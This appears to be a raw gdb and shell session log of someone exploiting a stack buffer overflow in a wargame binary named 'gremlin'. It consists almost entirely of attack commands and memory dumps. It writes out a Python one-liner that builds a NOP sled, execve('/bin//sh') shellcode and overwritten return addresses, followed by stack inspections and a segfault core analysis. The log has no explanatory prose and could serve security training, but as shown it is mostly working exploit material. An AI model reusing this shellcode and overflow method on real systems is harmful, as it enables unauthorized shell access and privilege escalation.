0x8048483 <main+83>:	ret    
0x8048484 <main+84>:	nop    
0x8048485 <main+85>:	nop    
0x8048486 <main+86>:	nop    
0x8048487 <main+87>:	nop    
0x8048488 <main+88>:	nop    
0x8048489 <main+89>:	nop    
0x804848a <main+90>:	nop    
0x804848b <main+91>:	nop    
0x804848c <main+92>:	nop    
0x804848d <main+93>:	nop    
0x804848e <main+94>:	nop    
0x804848f <main+95>:	nop    
End of assembler dump.
(gdb) b *main+79
Breakpoint 1 at 0x804847f
(gdb) r `python -c 'print "0x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
Starting program: /home/gate/temp/gremlin `python -c 'print "0x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
0x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x900x901󿿐h//shh/bin⏓ኂ°
                                                                                                       ̀ 

Breakpoint 1, 0x804847f in main ()
(gdb) x/i $eip
0x804847f <main+79>:	add    $0x8,%esp
(gdb) x/x $esp
0xbffff650:	0x080484ec
(gdb) 
0xbffff654:	0xbffff658
(gdb) 
0xbffff658:	0x30397830
(gdb) 
0xbffff65c:	0x30397830
(gdb) 
0xbffff660:	0x30397830
(gdb) 
0xbffff664:	0x30397830
(gdb) x/x $esp-100
0xbffff5ec:	0x400146b0
(gdb) x/100x $esp-100
0xbffff5ec:	0x400146b0	0x00000007	0x4000a74e	0x401081ec
0xbffff5fc:	0x4000ae60	0xbffff7a4	0x400143e0	0x40021df0
0xbffff60c:	0x401088c0	0x4002982c	0x40021df0	0xbffff648
0xbffff61c:	0x4000a970	0xbffffc63	0xfffffdaa	0x4005d920
0xbffff62c:	0x400143e0	0xbffff648	0x40066070	0x40106980
0xbffff63c:	0x080484ec	0xbffff658	0x401081ec	0xbffff758
0xbffff64c:	0x0804847f	0x080484ec	0xbffff658	0x30397830
0xbffff65c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff66c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff67c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff68c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff69c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6ac:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6bc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6cc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6dc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6ec:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff6fc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff70c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff71c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff72c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff73c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff74c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff75c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff76c:	0x30397830	0x30397830	0x30397830	0x30397830
(gdb) 
0xbffff77c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff78c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff79c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7ac:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7bc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7cc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7dc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7ec:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff7fc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff80c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff81c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff82c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff83c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff84c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff85c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff86c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff87c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff88c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff89c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8ac:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8bc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8cc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8dc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8ec:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff8fc:	0x30397830	0x30397830	0x30397830	0x30397830
(gdb) 
0xbffff90c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff91c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff92c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff93c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff94c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff95c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff96c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff97c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff98c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff99c:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff9ac:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff9bc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff9cc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff9dc:	0x30397830	0x30397830	0x30397830	0x30397830
0xbffff9ec:	0x30397830	0x30397830	0x6850c031	0x68732f2f
0xbffff9fc:	0x69622f68	0x50e3896e	0x89e18953	0xcd0bb0c2
0xbffffa0c:	0x39780080	0x39783030	0x39783030	0x39783030
0xbffffa1c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa2c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa3c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa4c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa5c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa6c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa7c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffa8c:	0x39783030	0x39783030	0x39783030	0x39783030
(gdb) 
0xbffffa9c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffaac:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffabc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffacc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffadc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffaec:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffafc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb0c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb1c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb2c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb3c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb4c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb5c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb6c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb7c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb8c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffb9c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbac:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbbc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbcc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbdc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbec:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffbfc:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffc0c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffc1c:	0x39783030	0x39783030	0x39783030	0x39783030
(gdb) 
0xbffffc2c:	0x39783030	0x39783030	0x39783030	0x39783030
0xbffffc3c:	0x39783030	0x39783030	0x39783030	0x50c03130
0xbffffc4c:	0x732f2f68	0x622f6868	0xe3896e69	0xe1895350
0xbffffc5c:	0x0bb0c289	0x4c0080cd	0x4f535345	0x3d4e4550
0xbffffc6c:	0x73752f7c	0x69622f72	0x656c2f6e	0x69707373
0xbffffc7c:	0x732e6570	0x73252068	0x45535500	0x4d414e52
0xbffffc8c:	0x48003d45	0x53545349	0x3d455a49	0x30303031
0xbffffc9c:	0x534f4800	0x4d414e54	0x6f6c3d45	0x686c6163
0xbffffcac:	0x2e74736f	0x61636f6c	0x6d6f646c	0x006e6961
0xbffffcbc:	0x4e474f4c	0x3d454d41	0x65746167	0x4d455200
0xbffffccc:	0x4845544f	0x3d54534f	0x2e323931	0x2e383631
0xbffffcdc:	0x2e353332	0x414d0031	0x2f3d4c49	0x2f726176
0xbffffcec:	0x6f6f7073	0x616d2f6c	0x672f6c69	0x00657461
0xbffffcfc:	0x4843414d	0x45505954	0x3833693d	0x65722d36
0xbffffd0c:	0x74616864	0x6e696c2d	0x672d7875	0x5400756e
0xbffffd1c:	0x3d4d5245	0x72657478	0x4f48006d	0x59545453
0xbffffd2c:	0x693d4550	0x00363833	0x48544150	0x73752f3d
0xbffffd3c:	0x6f6c2f72	0x2f6c6163	0x3a6e6962	0x6e69622f
0xbffffd4c:	0x73752f3a	0x69622f72	0x752f3a6e	0x582f7273
0xbffffd5c:	0x36523131	0x6e69622f	0x6f682f3a	0x672f656d
0xbffffd6c:	0x2f657461	0x006e6962	0x454d4f48	0x6f682f3d
0xbffffd7c:	0x672f656d	0x00657461	0x55504e49	0x3d435254
0xbffffd8c:	0x6374652f	0x706e692f	0x63727475	0x45485300
0xbffffd9c:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x45535500
0xbffffdac:	0x61673d52	0x42006574	0x5f485341	0x3d564e45
(gdb) 
0xbffffdbc:	0x6d6f682f	0x61672f65	0x2e2f6574	0x68736162
0xbffffdcc:	0x44006372	0x4c505349	0x313d5941	0x312e3239
0xbffffddc:	0x322e3836	0x312e3533	0x302e303a	0x4e414c00
0xbffffdec:	0x6e653d47	0x0053555f	0x5954534f	0x6c3d4550
0xbffffdfc:	0x78756e69	0x756e672d	0x44575000	0x6f682f3d
0xbffffe0c:	0x672f656d	0x2f657461	0x706d6574	0x4c485300
0xbffffe1c:	0x323d4c56	0x5f534c00	0x4f4c4f43	0x6e3d5352
0xbffffe2c:	0x30303d6f	0x3d69663a	0x643a3030	0x31303d69
0xbffffe3c:	0x3a34333b	0x303d6e6c	0x36333b31	0x3d69703a
0xbffffe4c:	0x333b3034	0x6f733a33	0x3b31303d	0x623a3533
0xbffffe5c:	0x30343d64	0x3b33333b	0x633a3130	0x30343d64
0xbffffe6c:	0x3b33333b	0x6f3a3130	0x31303d72	0x3b35303b
0xbffffe7c:	0x343b3733	0x696d3a31	0x3b31303d	0x333b3530
0xbffffe8c:	0x31343b37	0x3d78653a	0x333b3130	0x2e2a3a32
0xbffffe9c:	0x3d646d63	0x333b3130	0x2e2a3a32	0x3d657865
0xbffffeac:	0x333b3130	0x2e2a3a32	0x3d6d6f63	0x333b3130
0xbffffebc:	0x2e2a3a32	0x3d6d7462	0x333b3130	0x2e2a3a32
0xbffffecc:	0x3d746162	0x333b3130	0x2e2a3a32	0x303d6873
0xbffffedc:	0x32333b31	0x632e2a3a	0x303d6873	0x32333b31
0xbffffeec:	0x742e2a3a	0x303d7261	0x31333b31	0x742e2a3a
0xbffffefc:	0x303d7a67	0x31333b31	0x612e2a3a	0x303d6a72
0xbfffff0c:	0x31333b31	0x742e2a3a	0x303d7a61	0x31333b31
0xbfffff1c:	0x6c2e2a3a	0x303d687a	0x31333b31	0x7a2e2a3a
0xbfffff2c:	0x303d7069	0x31333b31	0x7a2e2a3a	0x3b31303d
0xbfffff3c:	0x2a3a3133	0x303d5a2e	0x31333b31	0x672e2a3a
(gdb) 
0xbfffff4c:	0x31303d7a	0x3a31333b	0x7a622e2a	0x31303d32
0xbfffff5c:	0x3a31333b	0x7a622e2a	0x3b31303d	0x2a3a3133
0xbfffff6c:	0x3d7a742e	0x333b3130	0x2e2a3a31	0x3d6d7072
0xbfffff7c:	0x333b3130	0x2e2a3a31	0x6f697063	0x3b31303d
0xbfffff8c:	0x2a3a3133	0x67706a2e	0x3b31303d	0x2a3a3533
0xbfffff9c:	0x6669672e	0x3b31303d	0x2a3a3533	0x706d622e
0xbfffffac:	0x3b31303d	0x2a3a3533	0x6d62782e	0x3b31303d
0xbfffffbc:	0x2a3a3533	0x6d70782e	0x3b31303d	0x2a3a3533
0xbfffffcc:	0x676e702e	0x3b31303d	0x2a3a3533	0x6669742e
0xbfffffdc:	0x3b31303d	0x003a3533	0x6d6f682f	0x61672f65
0xbfffffec:	0x742f6574	0x2f706d65	0x6d657267	0x006e696c
0xbffffffc:	0x00000000	Cannot access memory at address 0xc0000000
(gdb) 
0xc0000004:	Cannot access memory at address 0xc0000004
(gdb) r `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/gate/temp/gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ 

Breakpoint 1, 0x804847f in main ()
(gdb) x/100x $esp-100
0xbffff89c:	0x400146b0	0x00000007	0x4000a74e	0x401081ec
0xbffff8ac:	0x4000ae60	0xbffffa54	0x400143e0	0x40021df0
0xbffff8bc:	0x401088c0	0x4002982c	0x40021df0	0xbffff8f8
0xbffff8cc:	0x4000a970	0xbffffc63	0xfffffda5	0x4005d920
0xbffff8dc:	0x400143e0	0xbffff8f8	0x40066070	0x40106980
0xbffff8ec:	0x080484ec	0xbffff908	0x401081ec	0xbffffa08
0xbffff8fc:	0x0804847f	0x080484ec	0xbffff908	0x90909090
0xbffff90c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff91c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff92c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff93c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff94c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff95c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff96c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff97c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff98c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff99c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9ac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9bc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9cc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9dc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff9ec:	0x31909090	0x2f6850c0	0x6868732f	0x6e69622f
0xbffff9fc:	0x5350e389	0xc289e189	0x80cd0bb0	0xbffffa00
0xbffffa0c:	0x400309cb	0x00000002	0xbffffa54	0xbffffa60
0xbffffa1c:	0x40013868	0x00000002	0x08048380	0x00000000
(gdb) x/100b $esp-100
0xbffff89c:	0xb0	0x46	0x01	0x40	0x07	0x00	0x00	0x00
0xbffff8a4:	0x4e	0xa7	0x00	0x40	0xec	0x81	0x10	0x40
0xbffff8ac:	0x60	0xae	0x00	0x40	0x54	0xfa	0xff	0xbf
0xbffff8b4:	0xe0	0x43	0x01	0x40	0xf0	0x1d	0x02	0x40
0xbffff8bc:	0xc0	0x88	0x10	0x40	0x2c	0x98	0x02	0x40
0xbffff8c4:	0xf0	0x1d	0x02	0x40	0xf8	0xf8	0xff	0xbf
0xbffff8cc:	0x70	0xa9	0x00	0x40	0x63	0xfc	0xff	0xbf
0xbffff8d4:	0xa5	0xfd	0xff	0xff	0x20	0xd9	0x05	0x40
0xbffff8dc:	0xe0	0x43	0x01	0x40	0xf8	0xf8	0xff	0xbf
0xbffff8e4:	0x70	0x60	0x06	0x40	0x80	0x69	0x10	0x40
0xbffff8ec:	0xec	0x84	0x04	0x08	0x08	0xf9	0xff	0xbf
0xbffff8f4:	0xec	0x81	0x10	0x40	0x08	0xfa	0xff	0xbf
0xbffff8fc:	0x7f	0x84	0x04	0x08
(gdb) 
0xbffff900:	0xec	0x84	0x04	0x08	0x08	0xf9	0xff	0xbf
0xbffff908:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff910:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff918:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff920:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff928:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff930:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff938:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff940:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff948:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff950:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff958:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff960:	0x90	0x90	0x90	0x90
(gdb) 
0xbffff964:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff96c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff974:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff97c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff984:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff98c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff994:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff99c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9a4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9ac:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9b4:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9bc:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9c4:	0x90	0x90	0x90	0x90
(gdb) 
0xbffff9c8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9d0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9d8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9e0:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xbffff9e8:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x31
0xbffff9f0:	0xc0	0x50	0x68	0x2f	0x2f	0x73	0x68	0x68
0xbffff9f8:	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x50	0x53
0xbffffa00:	0x89	0xe1	0x89	0xc2	0xb0	0x0b	0xcd	0x80
0xbffffa08:	0x00	0xfa	0xff	0xbf	0xcb	0x09	0x03	0x40
0xbffffa10:	0x02	0x00	0x00	0x00	0x54	0xfa	0xff	0xbf
0xbffffa18:	0x60	0xfa	0xff	0xbf	0x68	0x38	0x01	0x40
0xbffffa20:	0x02	0x00	0x00	0x00	0x80	0x83	0x04	0x08
0xbffffa28:	0x00	0x00	0x00	0x00
(gdb) 
0xbffffa2c:	0xa1	0x83	0x04	0x08	0x30	0x84	0x04	0x08
0xbffffa34:	0x02	0x00	0x00	0x00	0x54	0xfa	0xff	0xbf
0xbffffa3c:	0xe0	0x82	0x04	0x08	0xbc	0x84	0x04	0x08
0xbffffa44:	0x60	0xae	0x00	0x40	0x4c	0xfa	0xff	0xbf
0xbffffa4c:	0x90	0x3e	0x01	0x40	0x02	0x00	0x00	0x00
0xbffffa54:	0x4a	0xfb	0xff	0xbf	0x62	0xfb	0xff	0xbf
0xbffffa5c:	0x00	0x00	0x00	0x00	0x63	0xfc	0xff	0xbf
0xbffffa64:	0x85	0xfc	0xff	0xbf	0x8f	0xfc	0xff	0xbf
0xbffffa6c:	0x9d	0xfc	0xff	0xbf	0xbc	0xfc	0xff	0xbf
0xbffffa74:	0xc9	0xfc	0xff	0xbf	0xe2	0xfc	0xff	0xbf
0xbffffa7c:	0xfc	0xfc	0xff	0xbf	0x1b	0xfd	0xff	0xbf
0xbffffa84:	0x26	0xfd	0xff	0xbf	0x34	0xfd	0xff	0xbf
0xbffffa8c:	0x74	0xfd	0xff	0xbf
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gate@localhost temp]$ ./gremlin `python -c 'print "\x90"*231+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\xff\xff\xff\xbf"+"\x38\xf8\xff\xbf"'`
1󿿐h//shh/bin⏓ኂ°
               ̀ÿÿÿ¿8
Segmentation fault (core dumped)
[gate@localhost temp]$ ls
core  gremlin  gremlin.c  pay.txt  re.txt
[gate@localhost temp]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./gremlin '.
Program terminated with signal 11, Segmentation fault.
#0  0xbffff838 in ?? ()
(gdb) x $esp
0xbffffa10:	0x00000000
(gdb) x/10 $esp
0xbffffa10:	0x00000000	0xbffffa54	0xbffffa60	0x40013868
0xbffffa20:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffa30:	0x08048430	0x00000002
(gdb) x/10 $esp
0xbffffa10:	0x00000000	0xbffffa54	0xbffffa60	0x40013868
0xbffffa20:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffa30:	0x08048430	0x00000002
(gdb) 
0xbffffa38:	0xbffffa54	0x080482e0	0x080484bc	0x4000ae60
0xbffffa48:	0xbffffa4c	0x40013e90	0x00000002	0xbffffb52
0xbffffa58:	0xbffffb5c	0x00000000
(gdb) 
0xbffffa60:	0xbffffc65	0xbffffc79	0xbffffc92	0xbffffcb1
0xbffffa70:	0xbffffcd3	0xbffffcdd	0xbffffea0	0xbffffebf
0xbffffa80:	0xbffffed9	0xbffffeee
(gdb) 
0xbffffa88:	0xbfffff0a	0xbfffff15	0xbfffff2f	0xbfffff3c
0xbffffa98:	0xbfffff44	0xbfffff4e	0xbfffff5e	0xbfffff6c
0xbffffaa8:	0xbfffff7a	0xbfffff8b
(gdb) 
0xbffffab0:	0xbfffff96	0xbfffffa6	0xbfffffe6	0x00000000
0xbffffac0:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffad0:	0x00000005	0x00000006
(gdb) 
0xbffffad8:	0x00000006	0x00001000	0x00000007	0x40000000
0xbffffae8:	0x00000008	0x00000000	0x00000009	0x08048380
0xbffffaf8:	0x0000000b	0x000001f4
(gdb) 
0xbffffb00:	0x0000000c	0x000001f4	0x0000000d	0x000001f4
0xbffffb10:	0x0000000e	0x000001f4	0x00000010	0x0fabfbff
0xbffffb20:	0x0000000f	0xbffffb4d
(gdb) 
0xbffffb28:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb48:	0x00000000	0x38366900
(gdb) 
0xbffffb50:	0x2f2e0036	0x6d657267	0x006e696c	0x90909090
0xbffffb60:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb70:	0x90909090	0x90909090
(gdb) 
0xbffffb78:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb88:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb98:	0x90909090	0x90909090
(gdb) 
0xbffffba0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc0:	0x90909090	0x90909090
(gdb) 
0xbffffbc8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbd8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbe8:	0x90909090	0x90909090
(gdb) 
0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc10:	0x90909090	0x90909090
(gdb) 
0xbffffc18:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc28:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc38:	0x90909090	0x90909090
(gdb) 
0xbffffc40:	0x31909090	0x2f6850c0	0x6868732f	0x6e69622f
0xbffffc50:	0x5350e389	0xc289e189	0x80cd0bb0	0xbfffffff
0xbffffc60:	0xbffff838	0x44575000
(gdb) 
0xbffffc68:	0x6f682f3d	0x672f656d	0x2f657461	0x706d6574
0xbffffc78:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffc88:	0x2e383631	0x2e353332
(gdb) x/100b $esp
0xbffffa10:	0x00	0x00	0x00	0x00	0x54	0xfa	0xff	0xbf
0xbffffa18:	0x60	0xfa	0xff	0xbf	0x68	0x38	0x01	0x40
0xbffffa20:	0x02	0x00	0x00	0x00	0x80	0x83	0x04	0x08
0xbffffa28:	0x00	0x00	0x00	0x00	0xa1	0x83	0x04	0x08
0xbffffa30:	0x30	0x84	0x04	0x08	0x02	0x00	0x00	0x00
0xbffffa38:	0x54	0xfa	0xff	0xbf	0xe0	0x82	0x04	0x08
0xbffffa40:	0xbc	0x84	0x04	0x08	0x60	0xae	0x00	0x40
0xbffffa48:	0x4c	0xfa	0xff	0xbf	0x90	0x3e	0x01	0x40
0xbffffa50:	0x02	0x00	0x00	0x00	0x52	0xfb	0xff	0xbf
0xbffffa58:	0x5c	0xfb	0xff	0xbf	0x00	0x00	0x00	0x00
0xbffffa60:	0x65	0xfc	0xff	0xbf	0x79	0xfc	0xff	0xbf
0xbffffa68:	0x92	0xfc	0xff	0xbf	0xb1	0xfc	0xff	0xbf
0xbffffa70:	0xd3	0xfc	0xff	0xbf
(gdb) 
0xbffffa74:	0xdd	0xfc	0xff	0xbf	0xa0	0xfe	0xff	0xbf
0xbffffa7c:	0xbf	0xfe	0xff	0xbf	0xd9	0xfe	0xff	0xbf
0xbffffa84:	0xee	0xfe	0xff	0xbf	0x0a	0xff	0xff	0xbf
0xbffffa8c:	0x15	0xff	0xff	0xbf	0x2f	0xff	0xff	0xbf
0xbffffa94:	0x3c	0xff	0xff	0xbf	0x44	0xff	0xff	0xbf
0xbffffa9c:	0x4e	0xff	0xff	0xbf	0x5e	0xff	0xff	0xbf
0xbffffaa4:	0x6c	0xff	0xff	0xbf	0x7a	0xff	0xff	0xbf
0xbffffaac:	0x8b	0xff	0xff	0xbf	0x96	0xff	0xff	0xbf
0xbffffab4:	0xa6	0xff	0xff	0xbf	0xe6	0xff	0xff	0xbf
0xbffffabc:	0x00	0x00	0x00	0x00	0x03	0x00	0x00	0x00
0xbffffac4:	0x34	0x80	0x04	0x08	0x04	0x00	0x00	0x00
0xbffffacc:	0x20	0x00	0x00	0x00	0x05	0x00	0x00	0x00
0xbffffad4:	0x06	0x00	0x00	0x00
(gdb) 
0xbffffad8:	0x06	0x00	0x00	0x00	0x00	0x10	0x00	0x00
0xbffffae0:	0x07	0x00	0x00	0x00	0x00	0x00	0x00	0x40
0xbffffae8:	0x08	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffffaf0:	0x09	0x00	0x00	0x00	0x80	0x83	0x04	0x08
0xbffffaf8:	0x0b	0x00	0x00	0x00	0xf4	0x01	0x00	0x00
0xbffffb00:	0x0c	0x00	0x00	0x00	0xf4	0x01	0x00	0x00
0xbffffb08:	0x0d	0x00	0x00	0x00	0xf4	0x01	0x00	0x00
